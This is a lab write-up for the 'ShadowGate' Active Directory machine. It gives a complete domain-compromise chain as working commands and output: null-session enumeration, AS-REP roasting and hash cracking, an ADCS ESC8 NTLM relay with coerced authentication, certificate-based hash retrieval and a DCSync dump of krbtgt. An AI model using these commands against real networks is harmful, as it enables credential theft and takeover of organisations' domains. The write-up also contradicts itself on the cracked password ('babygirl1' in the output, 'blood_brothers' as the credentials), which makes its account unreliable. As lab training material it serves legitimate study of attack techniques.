---
{"dg-publish":true,"permalink":"/shadowgate-notion/","dg-note-properties":{}}
---

# HackSmarterLabs — ShadowGate (Easy)



---

---




**Date:** 2026-08-08
**Tester:** Eleni Tsermentseli
**Domain:** shadow.gate
**Target:** 10.1.143.103 (DC01.shadow.gate)
**Difficulty:** Easy

---

## Objective

Black box internal penetration test. No credentials provided. Goal: achieve full domain compromise.

---

## Enumeration

### Nmap

Ran a full port scan against the target:

```bash
nmap -sV -sC -p- --min-rate 5000 -Pn 10.1.143.103
```

Identified a classic Active Directory Domain Controller:

- **53** — DNS
- **80** — IIS 10.0 (Microsoft-IIS/10.0)
- **88** — Kerberos
- **135/139/445** — SMB (signing: **False**)
- **389/636/3268/3269** — LDAP (Domain: shadow.gate)
- **3389** — RDP
- **5985** — WinRM

Key findings:
- Domain: `shadow.gate`
- DC hostname: `DC01.shadow.gate`
- OS: Windows Server 2022 (Build 20348)
- **SMB signing disabled** — NTLM relay attacks viable

---

## User Enumeration

### SMB Null Session

Attempted null session enumeration:

```bash
netexec smb 10.1.143.103 -u '' -p '' --users
```

Successfully enumerated 12 domain users:

```
Administrator, Guest, krbtgt, ATHENA, mbrownlee, bbrown,
jtrueblood, jsmith, clocke, tclarke, jbradford, amoss
```

### Web Enumeration

Ran feroxbuster against the IIS server:

```bash
feroxbuster -u http://10.1.143.103 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,txt,config
```

Discovered `/certsrv` (HTTP 401) — **Active Directory Certificate Services (ADCS)** is installed.

---

## AS-REP Roasting

With the user list, tested for accounts with Kerberos pre-authentication disabled:

```bash
impacket-GetNPUsers shadow.gate/ -usersfile users_clean.txt -no-pass -dc-ip 10.1.143.103
```

Got a hit for `jtrueblood`:

```
$krb5asrep$23$jtrueblood@SHADOW.GATE:3961e8899306bc42...
```

Cracked the hash offline with John the Ripper:

```bash
john jtrueblood.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
babygirl1        (jtrueblood)
```

Credentials obtained: `jtrueblood:blood_brothers`

---

## ADCS Enumeration

With valid credentials, enumerated ADCS for vulnerabilities:

```bash
certipy-ad find -u jtrueblood@shadow.gate -p 'blood_brothers' \
  -dc-ip 10.1.143.103 -stdout -vulnerable
```

Identified **ESC8** vulnerability:

```
[!] Vulnerabilities
  ESC8: Web Enrollment is enabled over HTTP.
```

Web enrollment accessible at `http://DC01.shadow.gate/certsrv/certfnsh.asp` over HTTP without EPA enforcement.

---

## ESC8 — NTLM Relay to ADCS

### Setup relay listener

```bash
sudo impacket-ntlmrelayx -t http://10.1.143.103/certsrv/certfnsh.asp \
  -smb2support --adcs --template "DomainController" --no-wcf-server
```

### Coerce DC authentication

Used Coercer to force the DC to authenticate to our listener:

```bash
coercer coerce -l 10.200.79.101 -t 10.1.143.103 \
  -u jtrueblood -p 'blood_brothers' -d shadow.gate
```

### Result

```
[*] GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
[*] Certificate successfully written to file
```

Successfully obtained a certificate for `DC01$`.

---

## Certificate Authentication — Getting DC01$ Hash

Used the certificate to authenticate as DC01$:

```bash
certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.143.103
```

```
[*] Got TGT
[*] Got hash for 'dc01$@shadow.gate':
aad3b435b51404eeaad3b435b51404ee:1f91cfb5339663a2afac75ae48210e9b
```

---

## DCSync — KRBTGT Hash

With the DC01$ machine account hash, performed a DCSync attack:

```bash
impacket-secretsdump -just-dc-user krbtgt \
  'shadow.gate/DC01$@10.1.143.103' \
  -hashes aad3b435b51404eeaad3b435b51404ee:1f91cfb5339663a2afac75ae48210e9b
```

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5509cbfe52e94940c0ec99b21e09802:::
krbtgt:aes256-cts-hmac-sha1-96:9d2c8f2fecd0d6813cde513680b594210cf9c91bc2d4f6715ce25972b6a7c7c5
```

KRBTGT NT Hash: `~{b5509cbfe52e94940c0ec99b21e09802}`



Full domain compromise achieved. ✅

---

## Attack Chain Summary

```
Unauthenticated
      ↓
SMB Null Session → User Enumeration (12 users)
      ↓
AS-REP Roasting → jtrueblood hash
      ↓
John the Ripper → jtrueblood:blood_brothers
      ↓
ADCS Enumeration → ESC8 identified
      ↓
NTLM Relay (ntlmrelayx + Coercer) → DC01$ certificate
      ↓
Certipy Auth → DC01$ NT hash
      ↓
DCSync → KRBTGT hash
      ↓
Full Domain Compromise ✅
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning |
| NetExec | SMB/LDAP enumeration |
| Kerbrute | Username enumeration |
| Impacket GetNPUsers | AS-REP Roasting |
| John the Ripper | Hash cracking |
| Certipy-AD | ADCS enumeration & ESC8 |
| Impacket ntlmrelayx | NTLM relay |
| Coercer | Authentication coercion |
| Impacket secretsdump | DCSync |
